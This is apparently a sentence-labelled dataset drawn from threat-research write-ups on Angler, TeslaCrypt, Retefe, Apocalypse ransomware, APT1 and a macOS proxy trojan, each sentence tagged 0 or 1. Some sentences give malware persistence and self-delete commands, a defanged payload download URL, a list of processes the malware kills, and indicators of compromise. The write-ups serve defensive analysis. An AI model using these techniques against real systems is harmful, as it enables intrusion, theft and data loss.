1608	The malware will then give the current user admin privileges immediately on demand without prompting for a password.	0
1609	This is done so that the malware won’t provoke constant admin password prompts when abusing its admin privileges with the sudo command.	0
1610	This is done by adding the following line to /etc/sudoers: The malware then changes the victim system’s network settings such that all outgoing connections will pass through a proxy, which is dynamically obtained from a Proxy AutoConfiguration (PAC) file sitting in a malicious server.	1
1611	The script that makes this configuration changes can be seen below: Then resulting change can be seen in the Network Settings: The malware will then proceed to install a new root certificate in the victim system, which allows the attacker to intercept the victim’s traffic using a Man in The Middle (MiTM) attack.	0
1612	By abusing the victim’s new-found trust in this bogus certificate, the attacker can impersonate any website, and the victim will be none the wiser.	0
1613	The new certificate is installed using the following command: The newly-installed certificate can be seen in the two images below.	0
1614	The malware will also install 2 LaunchAgents that will start with system boot, and have the following names: These LaunchAgents will redirect requests to 127.0.0.1 through the dark web address “paoyu7gub72lykuk.onion“.	1
1615	This is necessary for the previous PAC configuration to work (note that the original configuration looks for the PAC file on the local host 127.0.0.1).	1
1616	These LaunchAgents consist of the following BASH commands: As a result of all of the above actions, when attempting to surf the web, the user’s web browser will first ask the attacker web page on TOR for proxy settings.	0
1617	The user traffic is then redirected through a proxy controlled by the attacker, who carries out a Man-In-the-Middle attack and impersonates the various sites the user attempts to surf.	0
1618	The attacker is free to read the victim’s traffic and tamper with it in any way they please.	0
1619	When done, the malware will delete itself.	0
1620	All is left to say: beware of Trojans bearing gifts, especially if they ask for your root password.	0

1652	Angler EK: More Obfuscation, Fake Extensions, and Other Nonsense Cisco Blogs Share Cisco Blog > Threat Research Threat Research Angler EK: More Obfuscation, Fake Extensions, and Other Nonsense Talos GroupJune 5 2015 - 0 Comments This post was authored by Nick Biasini Late last week Talos researchers noticed a drastic uptick in Angler Exploit Kit activity.	0
1653	We have covered Angler previously, such as the discussion of domain shadowing.	0
1654	This exploit kit evolves on an almost constant basis.	0
1655	However, the recent activity caught our attention due to a change to the URL structure of the landing pages.	0
1656	This type of change doesn’t occur often and was coupled with some other interesting tidbits including how the HTTP 302 cushioning has evolved and the payload of another ransomware has changed.	0
1657	During research Talos identified several active Angler campaigns delivering different payloads via different methods.	0
1658	The first campaign was delivering Cryptowall, which will be covered in detail here.	0
1659	The second delivered Bedep with click fraud and illustrates the variety with which Angler can be used to deliver different payloads.	0
1660	The details of Bedep with click fraud has been covered thoroughly and will not be specifically discussed in this article.	0
1661	Angler Updates Before we discuss the changes let’s cover how the Angler Exploit Kit typically operates.	0
1662	Historically, users have been primarily exposed to the Angler exploit kit via malvertising.	0
1663	When a user encounters an exploit kit, users are typically sent through a redirect chain before winding up on the exploit kits landing page.	0
1664	The gate where users redirected to typically has a has structure similar to the following: /some_random_words_here/154920479320 This is where the final redirection occurs to the landing page that is serving the exploits that compromise the system.	1
1665	This landing page normally looks something like this: /L8Vz9fnAJQ-NIIEeBal7h7QTEL5YpvcKfrOMuBGcE7sOA4Xt Which would then serve an exploit, usually Adobe Flash related, and then finally a payload, which has historically been Bedep mostly.	1
1666	At a high level, this is how Angler operated and the basic functionality remains the same.	0
1667	One thing that has been discussed previously is the use of 302 cushioning during the redirection chain.	0
1668	Basically, the initial redirection leads to a page that uses a HTTP code of 302 which is the HTTP return code for “Moved Temporarily”.	0
1669	This adds more layers to the redirection which continues with this campaign.	0
1670	This particular campaign falls back to an older methodology of utilizing compromised websites with scripts that are redirecting the user to the malicious site.	0
1671	This particular sample was being hosted on one such compromised site.	0
1672	Note the malicious iframe found in the code below: This malicious iframe is indicative of most iframes used in conjunction with exploit kits.	0
1673	However, there was a subtle change, instead of using the typical domain shadowing the use of a dynamic DNS provider was substituted.	0
1674	This again adds another small wrinkle and level of customization.	0
1675	The use of dynamic DNS in exploit kits isn’t new and is still widely used with Fiesta exploit kit.	0
1676	The addition of dynamic DNS was the first change.	0
1677	The second more significant change is related to the actual URL of the landing page.	0
1678	When the spike in our telemetry data was seen that’s when the change became obvious, although very subtle.	0
1679	The URL changed from what was shown above to one of the following URLs: /L8Vz9fnAJQ-NIIEeBal7h7QTEL5YpvcKfrOMuBGcE7sOA4Xt.php /w1smRNTBDuMu9mMm2EFsj-B_a8VpjJMEpo98-m4MezJhSsNS.play /F-4C7nrgQ1DuqCPXKC7e9ruFQmqVv-d5tYyK4xVtDMPy6Ywh.vbscript /pYRIH5ApZdFL4gLDzx8_VcaemFmBymXY0EQXrIM8RwAzISSo.pycharm /bcxo-513WCIhyfbChTj0JEsDjdfozPC0SDYufo-SEV2yU0TP.aspnet /2UQV9IGkBXFC2QCgiR6K96J94PqCOTf6kuIdm0VoZkfM21_N.cppfile /nM89-qFt1Dl3YUmj-OS3sqr-1J0fVPxbHf46FHklvmYCkWZJ.javabin /C9nRrUnG8wsks480kqIDBVw_Rrr7hmapSuqBmNAW0ZIgDMrL.jsscript /0qIbGTXEKgTKX-N8Cg8TOwQ4M49pH6FHKxPrcKq3CaY_06Vy.playme /b8WPbgZJNEPngVAz2Zq7PlHkS1T_N4TGrQzLZWJaGuRAON_0.cpp3 /6GAyyn99jAscOPNNN9VxCUH403etgcntIDdvwB0bs9RuYZtl.js8 /ee3m7b8DD1MfeRQp3NLByWQFlv6mRIUnlHKtxMKiV3fmugce.java1 /Grdelu0G6OwIxkOqjlRuoaIxa80ioqx-5_Ki2gQtBzeD7Kie.js /d4FDOgD1Mzck36MKTp6tdUTrq_jNHwqDuSgmgf5M0L7M1tSn.java /9XJUs2Vu29QnBDAQHH_QU0JeoVE__dtrZGovrxg3wdPZ1EWE.cpp /1Rk4kgr_OzlNhQxKBDbP_GmbYHiBJq5027gO83vayAeFXk4c.py /I1PiQRtfNiMqZHSFWu1JbMqFCCuJcVEWs9SDMhzNQibvFi_P.vb Obviously, the first portion of the string involves a randomly generated string.	1
1680	The part to focus on is the extensions.	0
1681	This is a significant change to the URL structure, by adding a varied list of extensions Angler authors are creating significantly more variation.	0
1682	The reason for the change has everything to do with detection.	0
1683	Most Angler landing page detection is done off of the URL structure and by making this change and adding a list of varying extensions, exploit kit authors bypass a huge amount of the detection technologies.	0
1684	This type of a change would be expected especially if there are other major changes underway.	0
1685	Much the same way that domain shadowing was unveiled at roughly the same time the Adobe Flash 0-day was dropped into this exploit kit.	0
1686	This isn’t the first time that the URL has evolved for Angler which previously made use of simple .php paths in the past before changing to the recent random string of text shown above.	0
1687	The actual content displayed to the user has remained largely static.	0
1688	Presenting the user with a series of quotes from Sense and Sensibility as shown below: Payload After compromising the user with a malicious Flash file or other exploit, the user is served a variant of Cryptowall.	0
1689	This isn’t uncommon behavior as we have seen an explosion in the delivery of various types of ransomware via exploit kits.	0
1690	This is a cheap and efficient way to make sure threat actors are able to compromise users for monetary gain.	0
1691	This specific variation of Cryptowall did have some interesting characteristics.	0
1692	First is the use of WordPress sites to store information.	0
1693	Talos observed a significant amount of potentially compromised WordPress sites being used to house information about the compromised systems including IP information as well as other key identifiers.	0
1694	One interesting thing was the amount of different domains contacted.	0
1695	Normally malware will contact several domains for different purposes (i.e C2, Dropped Files, Exfil, etc.).	0
1696	Its not uncommon to see a host contact ten different domains during an infection chain.	0
1697	This particular sample contacted almost 40 different domains and attempted to post data on 30 different WordPress sites.	0
1698	These posts were made to look like image files being posted and were seen posting to wordpress plugins that have been in the news over the last several months for being exploitable.	0
1699	Below are some sample images associated with the data that was posted: Portion of string uploaded to compromised WordPress Site These posts were done to two specific paths both associated with specific WordPress plugins.	0
1700	The first was revslider and the POST would look similar to what is shown below: The second is WP All Import and the POST would look similar to this: Both Revslider and WP All Import had recent severe vulnerabilities that resulted in a large amount of WordPress sites being exploited and eventually compromised.	1
1701	This is likely the method that the threat actors used to gain access to the sites and leverage them as locations for hosts to send data.	0
1702	This allows the threat actor to still be able to gather information regarding infected hosts without having the liability of an associated domain or server.	0
1703	Additionally, since the large majority of these sites utilize shared hosting it makes IP blacklisting far more challenging without impacting thousands of other legitimate websites.	0
1704	An analysis of our telemetry data has tracked this change back to earlier in 2015 continuing for several months.	0
1705	Depending on the data sent via POST from the compromised host a different response was returned.	0
1706	In some cases encoded commands and in others the image presented to the user for ransom purposes was downloaded.	0
1707	Also, included was additional 302 cushioning that pointed to specific sites being hosted from a hard coded IP address (194.6.233.7) or to a payment information site.	1
1708	Additionally, Talos found multiple occasions where a formerly compromised wordpress site had appeared to have been patched or at least had the malicious content removed.	0
1709	Sample 302 Response from WordPress site IOC Hashes: 28f6b5f344f7d2bef75b30ba2e286ddff3d3a2009da1d01d7e30e21feecfde34 (Flash Exploit) 023de93e9d686bf6a1f80ad68bde4f94c5100b534f95285c1582fb8b8be8d31f (Cryptowall 3.0 Sample) Domains: schapershonden-yhteenliittymin.inspirefilms.us capsteads-tmenupopup.mercuryoutboardnc.com mfrzdzjjpi.myftp.biz traditionetgourmandises.fr convenzioni.ording.roma.it 99mkb.com hostyoursitehere.com alpha.akesha.com andreiprundeanu.eu 4042shopping.com redstarfuochicinesi.it alebehr.com alchemyofpresence.com blationmedia.com jeanrey.fr awynnejoinery.co.uk americanfamilyenergy.com bezpiecznaswinka.pl redstarfuochicinesi.it buroroebers.nl bebeamor.co.uk jandchousecleaning.com asambleadedios.org buhtime.by asadiag.com beijerlandsekelnerrace.nl atlantacustomwork.com braingame.biz doggonesigns.com ancientvoyages.com gonavarro.com sweetthangzdesserts.com traditionetgourmandises.fr brandgriffin.com tarifair.fr alsblueshelpt.nl 7d2.c27.myftpupload.com autorijschoolconsistent.nl IP Addresses: 78.46.250.103 194.6.233.7 94.131.14.23 94.242.198.221 173.227.247.35 *Note: The large majority of the domains are residing on shared IP address space.	1
1710	To prevent affecting non-malicious domains hosted on these servers the IPs have been excluded.	0
1711	Conclusion Exploit kits are always going to evolve to improve efficiencies, increase evasion, maximize ability to compromise users, and create detection and prevention challenges.	0
1712	This is another example of how specifically the Angler Exploit Kit continues to change.	0
1713	This doesn’t always involve using new or novel techniques.	0
1714	In this example the EK went from being distributed via the newer technique of malvertising to reverting to malicious iframes on compromised websites.	0
1715	Also, it seems that a hybrid approach to URL’s has been undertaken by Angler.	0
1716	The old usage of .php files has been merged with the more recent randomized string to create a third variant of URL structure.	0
1717	Finally, the removal of domain shadowing for the 302 cushioning and the addition of dynamic DNS instead.	0
1718	This technique may be a relatively new feature to Angler, but has been in use by other Exploit Kits for some time.	0
1719	The payloads are another example of how exploit kits continue to evolve.	0
1720	The threat actors behind exploit kits are, like most people making money from hacking, jumping on the ransomware bandwagon.	0
1721	Ransomware works and makes reliable money.	0
1722	Threat actors realize this and are using whatever means necessary to get users infected.	0
1723	Exploit kits provide the perfect platform to infect large amounts of users and get lots of monetary gain.	0

1739	Your Package Has Been Successfully Encrypted: TeslaCrypt 4.1A and the Malware Attack Chain | Endgame BLOG REQUEST DEMO Toggle navigation Endgame OUR BLOG Blog REQUEST DEMO Your Package Has Been Successfully Encrypted: TeslaCrypt 4.1A and the Malware Attack Chain Mark Mager April 19 2016 Introduction Ransomware quickly gained national headlines in February after the Hollywood Presbyterian Medical Center in Los Angeles paid $17,000 in bitcoins to regain access to its systems.	0
1740	Since then, other hospitals have similarly been attacked with ransomware, leading some industry experts to proclaim it an industry-specific crisis.	0
1741	Although it is commonly associated with directed campaigns aimed at high-value targets such as hospitals, ransomware is actually becoming less targeted and more omnidirectional.	0
1742	As our latest research on TeslaCrypt demonstrates, ransomware not only is becoming more widespread, but it is also becoming more sophisticated and adaptable.	0
1743	TeslaCrypt 4.1A is only a week old and contains an even greater variety of stealth and obfuscation techniques than its previous variants, the earliest of which is just over a year old.	0
1744	Organizations and individuals alike must be aware ransomware is equally likely to be found in personal networks as in critical infrastructure networks, and that its rapid transformation and growing sophistication presents significant challenges to the security community and significant threats to users of all kinds.	0
1745	History and Current Reality of Ransomware Ransomware has been around for at least a decade, but its evolution and frequency have exploded over the last half year.	0
1746	In its early days, ransomware was relatively unsophisticated, uncommon, and more targeted.	0
1747	However, ransomware now largely involves code reuse, slight modifications to older families, and a variety of spam campaigns.	0
1748	Capabilities that once were the discrete realm of APTs are now accessible to attackers with fewer resources.	0
1749	TeslaCrypt 4.1A is indicative of this larger trend, integrating a variety of obfuscation techniques – such as AV evasion, anti-debugging, and stealth – into a powerful and rapidly changing piece of malware.	0
1750	Moreover, the incentive structure has shifted.	0
1751	Ransomware aimed at high-value targets depends entirely on getting one fish to bite, and so the ransom value is much higher.	0
1752	As the graphic below illustrates, with the proliferation of ransomware via widespread spam campaigns, attackers can demand smaller sums of money, which can still be extremely lucrative because it only requires infiltration of a small percentage of targets.	0
1753	Campaign Overview Last week, an Endgame researcher was analyzing spam emails for indications of emergent malicious activity.	0
1754	The researcher came upon an interesting set of emails, which were soon determined to be part of a widespread spam campaign.	0
1755	The emails all highlighted the successful delivery of a package, which can be tracked by simply clicking on a link.	0
1756	This is especially interesting timing.	0
1757	At the peak of procrastinators filing their taxes at the last minute, those who send in their tax forms are exactly the technically less-sophisticated users these kinds of campaigns target.	0
1758	We rapidly determined that this spam campaign was attempting to broadly deliver TeslaCrypt 4.1A to individuals.	1
1759	In the subsequent sections, we’ll detail the various stages of the TeslaCrypt 4.1A attack chain, moving from infiltration to detection evasion, anti-analysis and evasion features, entrenchment, and the malicious mission, concluding with some points on the user experience.	0
1760	This integration of various obfuscation and deception techniques is indicative of the larger trend in ransomware toward more sophisticated and multi-faceted capabilities.	0
1761	1.	0
1762	During infiltration, the downloader mechanism is attached as a zipped JavaScript file.2.	0
1763	This JavaScript file is a downloader that uses the local environment's Windows Script Host (WSH) or wscript to download the payload.	0
1764	When the ZIP file is decompressed and the JavaScript file is executed, the WSH will be invoked to execute the code.3.	0
1765	The downloader proceeds to download the TeslaCrypt implant via a HTTP GET request to greetingsyoungqq[.]com/80.exe.	1
1766	This binary will then be launched by the downloader.4.	1
1767	To evade debuggers, the binary uses QueryPerformance/GetTickCount evasion technique to check the runtime performance as well as threading.5.	1
1768	Next, the binary allocates heap memory to allocate a PE in memory.	0
1769	This PE does the following: a.	0
1770	It establishes an inter-process communication channel with the CoInitialize(), CoCreateInstance() APIs to communicate through DirectShow in order to establish various strings in memory.	0
1771	b.	0
1772	Uses QueryPerformance/GetTickCount debugging evasion technique c. Uses Wow64DisableWow64FsRedirection to disable file system redirection for the calling thread.	1
1773	d. Deletes Zone.Identifier ADS after successful execution e. Checks token membership for System Authority6.	1
1774	Next, the PE drops a copy of itself to the %UserProfile%\Documents\[12 random a-z characters].exe, creates a child process, and adds SeDebugPrivilege to the newly spawned process while in a separate thread7.	1
1775	Deletes parent binary using %COMSPEC% /C DEL %S8.	1
1776	"Creates mutex ""__wretw_w4523_345"" for more threading activity and runs a shell command to delete volume shadow copies9."	1
1777	It entrenches the binary into the registry via a startup run key10.	0
1778	During the encrypting, it generates the public key based on the encrypted private key.11.	0
1779	The implant begins encrypting all accessible files on the file system based on the file extensions in the appendix.12.	0
1780	Finally, it displays the ransom note in three forms: text, image, and web page.	0
1781	The binary will then notify the C2 server of the presence of a new victim.	0
1782	"Delivery and the Downloader In this instance, TeslaCrypt is delivered using a zipped email attachment containing a JavaScript downloader: Email Spam Attack Email contents <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""> <html xmlns=""http://www.w3.org/1999/xhtml""> <head> <title>RE:</title> </head> <body> <pre style=""font-style: strong""> Your package has been successfully delivered."	1
1783	The proof of delivery (TRK:299736593) is enclosed down below.	1
1784	</pre> </body> </html> The ZIP attachment will contain one file: transaction_wcVSdU.js.	1
1785	When the ZIP is decompressed and the JavaScript file is executed by the user, the Windows Script Host will launch and execute the JavaScript.	0
1786	The downloader initiates a HTTP GET request to the following URI in order to download the TeslaCrypt payload (6bfa1c01c3af6206a189b975178965fe): http://greetingsyoungqq[.]com/80.exe: As of 4-14-2016, this URI is inactive.	1
1787	If the request is successful, the binary will be written to disk in the current user's %TEMP% directory and launched by the JavaScript.	1
1788	The payload (80.exe) was not being flagged by most popular AV products on the day that we detected the malware, likely due to the obfuscation employed.	1
1789	A few days later, about 40% of AV vendors had updated their signatures to catch 80.exe, and a week later, a significant majority of AV vendors will flag this file as malicious.	1
1790	However, this wouldn’t help users who were victimized on the first day.	1
1791	TeslaCrypt 4.1A Implant Variant Details Version information contained within its metadata helps the implant masquerade itself as an official Windows system DLL: Upon execution, the implant unpacks itself by allocating and writing a clean PE file to heap memory.	1
1792	The clean PE that is invoked contains the implant’s intended malicious functionality.	0
1793	Anti-Analysis and Evasion Features This malware exhibits some interesting anti-analysis and evasion features which speak to its sophistication level.	0
1794	We will describe some of these below.	0
1795	String Obfuscation In order to evade detection and hide many of its string extractions, the binary utilizes an inter-process communications channel (COM objects).	0
1796	By using the CoInitialize and CoCreateInstance Windows APIs, the implant can control DirectShow via Software\Microsoft\DirectShow\PushClock using a covert channel, utilizing the quartz libraries.	1
1797	Anti-Debugging TeslaCrypt calls its anti-debugging function many times to thwart automated debugging or API monitoring.	0
1798	By using the QueryPerformance / GetTickCount evasion technique, the process stores the timer count at the beginning of an operation and then records it at the end of the operation.	1
1799	If the malware is being debugged, this time difference will be much more than the normal execution time expected.	0
1800	Anti-Monitoring This TeslaCrypt variant contains a routine designed to terminate five standard Windows administrative / process monitoring applications.	0
1801	The binary enumerates all active processes and utilizes GetProcessImageFileName to retrieve the executable filename for each process.	1
1802	A process will be terminated if its filename contains any of the following strings: taskmgr (Task Manager) regedi (Registry Editor) procex (SysInternals Process Explorer) msconfi (System Configuration) cmd (Command Shell) Entrenchment The implant drops a copy of itself to disk: %UserProfile%\Documents\[12 random a-z characters].exe In order to establish persistence, the implant adds a registry value that points to the dropped copy: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\%s\ SYSTEM32\CMD.EXE /C START %USERPROFILE%\Documents\[12 random a-z characters].exe The malware also sets the EnableLinkedConnections registry key: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLinkedConnections By setting this key (which was also something done by previous versions of TeslaCrypt), network drives become available to both regular users and administrators.	1
1803	This will allow the implant to easily access and encrypt files on connected network shares in addition to encrypting files on the local hard drive.	0
1804	In a connected business environment, this could substantially increase the damage done by the tool.	0
1805	Malicious Mission TeslaCrypt relies mostly on scare tactics to corner victims into paying the ransom.	0
1806	In reality, it’s making FALSE claims about its encryption usage and has recovery mechanisms that can help users recover files.	0
1807	Encryption Even though the malware's ransom message claims that the encryption used is RSA-4096, this algorithm is not used in any way.	1
1808	Instead, files are encrypted with AES256 CBC.	1
1809	In the encryption function it first generates the various keys which uses standard elliptic curve secp256k1 libraries which is typical for bitcoin related authors.	1
1810	An example of these keys can be seen in memory in the hex view below detailing memory status during master key generation.	0
1811	Once the keys are generated, they are then saved in %USERPROFILE%\Documents\desctop._ini and %USERPROFILE%\Documents\-!recover!-!file!-.txt.	1
1812	"If the malware detects that a file named ""desctop._ini"" already exists at the specified path, it will not start the key pair generation or encrypt any files because it already assumes that the files have already been encrypted."	1
1813	secp256k1 functions used for master key generation: Generated Keys Memory during the Master key generation: desctop.ini -!recover!-!file!-.txt Callback Routine If the binary successfully encrypts the targeted files on the host, it spins off a thread and initiates a callback routine that attempts HTTP POST requests to six different URIs: loseweightwithmysite[.]com/sys_info.php helcel[.	1

1820	This data includes host configuration information, version information pertaining to the implant, a randomly generated bitcoin address (where the affected user is instructed to direct their ransom payment), and key data needed to initiate a recovery of the encrypted files.	0
1821	"This information is placed in a query string format and will be subsequently encrypted and encoded prior to transmission in the POST request: Sub=[Ping: hardcoded callback mode]&dh=[combination of public and private key data]&addr=[bitcoin address generated at runtime]&size=0&version=[4.1a: hardcoded TeslaCrypt version number]&OS=[OS build number derived from VersionInformation.dwBuildNumber]&ID=[821: appears to be a hardcoded value possibly used to further identify a particular variant]&inst_id=[user ID generated at runtime] Provided below is a string with sample data: Sub=Ping&dh=04803B73A04A81984A83DB117D8D2C46678A5C3B828E55D265B0A4413FC248194F26505A967943D9FF05A7B5EC7DBF981BDADEB7702D98EA BA5D492B6429112FFC1478F386804A9CF31E38821425545563D7BCB9CC2BD46EA4FCAADD4BF473E6BD&addr=18px5E1cPWkEkT67TU14RgZ9g9dWbC3jfr&size=0&version= 4.1a&OS=7601&ID=821&inst_id=D19191ED8D504416 The query string will then be AES encrypted: An ASCII representation of the binary output of the AES encryption will then be written to memory: This data will then be attached to the ""data"" POST variable and transmitted in the request."	1
1822	If the implant successfully issues a POST request and receives a valid response from the callback server, the thread will terminate.	0
1823	The thread will also terminate if it does not receive a valid response after attempting one request to each of the callback servers.	0
1824	"Aside from the ""Ping"" mode (designated in the Sub query string variable), the binary also references a separate ""Crypted"" callback mode, though this mode does not appear to be accessible in this particular variant."	1
1825	User Experience The ransom information is displayed using 3 methods: 1) HTML page 2) text file 3) PNG image These files will also be written to disk in nearly every directory on the file system.	0
1826	The links for a real victim’s will reference the victim’s unique ID which facilitates payment tracking and decryption should the ransom be paid.	1
1827	HTML (-!RecOveR!-xdyxv++.Htm) TXT (-!RecOveR!-xdyxv++.Txt) PNG (-!RecOveR!-xdyxv++.Png) Conclusion TeslaCrypt 4.1A is indicative of the broader trend we’re seeing in ransomware.	0
1828	While the targeted, high-value targets dominate the press, ransomware is increasingly opportunistic as opposed to targeted.	0
1829	These randomized spam campaigns rely on infiltrating a very small percentage of targets, but are still extremely lucrative given their widespread dispersion.	0
1830	In addition, the shortened time-frame between variants also reflects the trends in ransomware over the last 6-12 months.	0
1831	The speed to update between variants is shrinking, while the sophistication is increasing.	0
1832	This makes reverse engineering the malware more onerous, including the use of deception techniques such as misleading researchers that RSA-4096 encryption is used when in reality it was AES-256.	0
1833	In short, not only does the spam campaign attempt to deceive potential targets, but TeslaCrypt 4.1A also aims to mislead and stay ahead of researchers attempting to reverse engineer it.	0
1834	Only four months into 2016 as our timeline demonstrates, this may very well be the year of the ransomware attack.	0
1835	These kinds of opportunistic attacks can be very lucrative and sophisticated, and should increasingly be on the radar of both high-value organizations as well as individuals.	1

1879	The tools, modus operandi, and infrastructure used in the campaign present two possibilities: either the Chinese cyber-espionage unit APT1 is perpetrating this activity, or another group is using the same tactics and tools as the legacy APT1.	0
1880	The Siesta campaign reinforces the fact that analysts and network defenders should remain on the lookout for known, public indicators and for shared attributes that allow security experts to detect multiple actors with one signature.	0
1881	Overview On March 6 2014 TrendMicro reported on the Siesta Campaign.	0
1882	Though not explicitly stated in this report, the tactics, techniques and procedures (TTPs) described in this report share a number of characteristics with historical activity we’ve attributed to APT1 (also known as the “Comment Crew”).	0
1883	We witnessed this same campaign targeting a customer in the telecommunications sector on Feb. 20 2014 using a spear-phishing message with a link to ifuedit[.]net/Healthcare_Questionnaire.zip.	1

1972	We have observed no other overlaps in infrastructure or tools between these two groups.	0
1973	A more likely possibility is that the shared resource between APT1 and the Menupass group is a binder tool.	0
1974	A binder tool enables a malicious actor to add an innocuous-looking icon, such as a PDF document icon, to a malicious dropper.	0
1975	This technique facilitates social engineering, presenting the end user with a file that looks like a PDF document rather than an executable.	0
1976	Figure 1 shows a builder that enables actors to bind a JPG image icon to a malicious executable.	0
1977	Figure 1: Binder tool for disguising executable files as JPGs Attribution Based on the evidence provided, the following are possibilities: Although we are not certain that APT1 is responsible for the Siesta activity, this current campaign shares a number of distinct characteristics with previous activity attributed to APT1.	0
1978	So What?	0
1979	Regardless of which group is responsible for this campaign, our analysis highlights the importance of monitoring for known indicators.	0
1980	As shown above, monitoring for previously disclosed indicators of compromise (IOCs), even IOCs that are years old, can yield value.	0
1981	Additionally, monitoring for IOCs and attributes of malware that are shared by multiple groups may also improve the effectiveness of your network defense operations.	0
1982	In this example, implementing detection for executables with a PE resource with a SHA256 hash of fb080cef60846528c409f60400f334100a16a5bd77b953c864b23a945fcf26fd would detect both Menupass and APT1 samples.	0

1990	The Retefe banking Trojan has been around for some time, targeting Sweden, Switzerland and Japan, as previously reported by Paloalto Research.	0
1991	We recently noticed Retefe campaigns targeting UK banking customers.	0
1992	Using fake certificates, the Trojan is designed to trick victims into giving up their login credentials and other sensitive information.	0
1993	At first, the victim receives a document with an embedded malicious JavaScript file per email.	0
1994	The document contains a very small image with a note asking the user to double click on it to view it better.	0
1995	After double clicking, the malicious embedded JavaScript is executed.	0
1996	The document has a notice message in German, however, the Trojan banker is targeting users in UK.	0
1997	The JavaScript is obfuscated with http://javascriptobfuscator.com.	1
1998	After the JavaScript is run, the script kills web browsers, installs a malicious certificate and changes the proxy auto-config to link to a website on Tor.	0
1999	,p> The warning message below regarding a certificate installation is briefly displayed, but then disappears.	0
2000	To make the message disappear, the JavaScript document also drops and executes a powershell script, which enumerates all the windows with class “”#32770 which is “The class for a dialog box”.	1
2001	If the window belongs to csrss or certutil processes, BM_CLICK message is sent to them, which simulates a user clicking “Yes”.	0
2002	Looking at Chrome’s HTTPS/SSL -> “Manage certificates…” menu, under “Trusted Root Certification Authorities”, we can see a certificate with a suspicious Issuer, “me@myhost.mydomain”.	1
2003	If we scroll down to the certificate details, we see the sha1 certificate thumbprint, which is an exact match to the thumbprint in the security warning displayed above.	0
2004	The certificate is stored in the registry in: HKEY_CURRENT_USER\Software\Microsoft\SystemCertificates\Root\Certificates\34E6D8C4F9F4448AC7B3B713E3A093BDF78436D9 The victim’s proxy settings are modified, as seen in registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL value.	1
2005	At this moment, the IP address matters.	0
2006	If the IP address is a non-UK IP address, an error message is shown and a proxy configuration is not served and, therefore, the victim is not redirected while browsing.	0
2007	However, if a UK IP address is found, the proxy auto-config script is run.	0
2008	After deobfuscating the code, we can see the list of targeted online banking systems and a malicious proxy that is used when users visit a website that matches patterns from the list below.	0
2009	You may notice a ‘*.com’ and ‘*.co.uk’.	0
2010	These are not specific banking websites, but whenever a victim goes to any of these websites, the traffic goes through the malicious proxy.	0
2011	Because the script installed the malicious root certificate, attackers may issue a certificate for any website, sign it with this malicious root certificate and the system will automatically trust it.	0
2012	This is used to run the man-in-the-middle attack and decrypt the encrypted communication.	0
2013	It means that the attackers can see all the credentials going through their malicious proxy.	0
2014	Let’s have a look at the malicious certificate for Barclays Bank.	0
2015	On both clean and infected machines, bank.barclays.co.uk has the green padlock icon saying that “Your connection to this site is private”.	0
2016	However, if we look at the certification path, on a clean machine (left image in the figure below), we can see the certificate path for bank.barclays.co.uk starts with Verisign, which is legit.	0
2017	On an infected machine, however, we can see the previously installed malicious certificate (right image in the figure below).	0
2018	All affected UK banks already know about the Trojan, and warn their customers on their sites of the danger.	0
2019	When infected users visit Barclays’ banking site, they are sent directly to a fake HTTPS login site that requires login credentials and/or additional personal data.	0
2020	If we compare the fake site to the original there is not much of a difference.	0
2021	This means unsuspecting victims can easily be fooled, unless they check the certificate validation.	0
2022	Fake Barclays site Clean, original site When a victim enters their credentials on the fake site, a counter appears to hold the user on the site.	0

2034	Apocalypse: Ransomware which targets companies through insecure RDP | Emsisoft | Security Blog Search for: Search for: Login Apocalypse: Ransomware which targets companies through insecure RDP Beyond a shadow of a doubt 2016 has been the year of the ransomware.	0
2035	So it comes as no surprise that new ransomware families are popping up on weekly basis.	0
2036	Emsisoft has been on the frontline battling ransomware for years now, providing users with valuable tools allowing them to recover their files after ransomware attacks.	0
2037	As a result Emsisoft researchers often find themselves at the receiving end of hate from ransomware authors.	0
2038	Late last year, we took a look at Radamant, whose authors included some rather unkind messages after our research team broke their amateurish ransomware.	0
2039	Today, we want to take a look at a new ransomware family Apocalypse, that reared its ugly head about 2 months ago, that recently started spewing insults towards our team as well.	0
2040	Meet Apocalypse The Apocalypse ransomware was first seen on the 9th May.	0
2041	The main attack vector is weak passwords on insecurely configured Windows servers running the remote desktop service.	0
2042	This allows an attacker to use brute force to gain access and means they can easily interact with the system as if they had access in person.	0
2043	Abusing remote desktop has become increasingly common over the last few months, especially for running ransomware like Apocalypse.	0
2044	The earliest variants install themselves to %appdata%windowsupdate.exe and create a run key called windows update to both HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE.	1
2045	This variant uses the .encrypted extension.	1
2046	A ransom note is created for every file in the form of *filename*.How_To_Decrypt.txt.	1
2047	The [email protected]/[email protected]/[email protected]/[email protected] email addresses are used in the ransom note.	0
2048	On June 9th, another version of the Apocalypse was discovered.	0
2049	This variant uses a different location, run key name and email address.	0
2050	The ransomware installs itself to %ProgramFiles%windowsupdate.exe, and creates a run key called windows update svc.	1
2051	The email address used in this variant is [email protected] On June 22nd, the newest variant was discovered, which changed a lot more.	0
2052	Instead of using windowsupdate, it uses firefox as a name instead.	0
2053	The newest version installs itself to %ProgramFiles%firefox.exe, and creates a run key called firefox update checker.	1
2054	The new extension is .SecureCrypted and new name for ransom note *filename*.Contact_Here_To_Recover_Your_Files.txt.	1
2055	The email address used is [email protected] A closer look into the latest variant To give you a better idea on how Apocalypse operates, we want to take a closer look at one of the newest variants with the hash AC70F2517698CA81BF161645413F168C.	1
2056	The ransomware first checks the default system language and if it is set to Russian, Ukrainian or Belarusian then the ransomware will quit and not encrypt the system.	0
2057	The ransomware then copies itself to %ProgramFiles%firefox.exe, if it doesn’t exist there already, and sets the hidden and system attributes.	1
2058	It also falsifies the timestamp of this file using the explorer.exe timestamp.	1
2059	Then a run value is created, so the ransomware can run on every startup: Creation of the run values Once installation is complete, it then runs the newly created firefox.exe, which then deletes the file.	1
2060	The firefox.exe file does two different tasks at the same time: First, it periodically checks whether certain Windows processes are running and then kills them.	1
2061	Second, it starts the encryption routine where it gets a list of all removable, fixed or remote network drives; the latter however is never encrypted due to a bug in the ransomware.	0
2062	The ransomware then scans all folders and any files found will be encrypted.	0
2063	However, the malware will not attempt to encrypt any files if they end in one of the following text strings: Files located in the Windows folder are skipped as well.	0
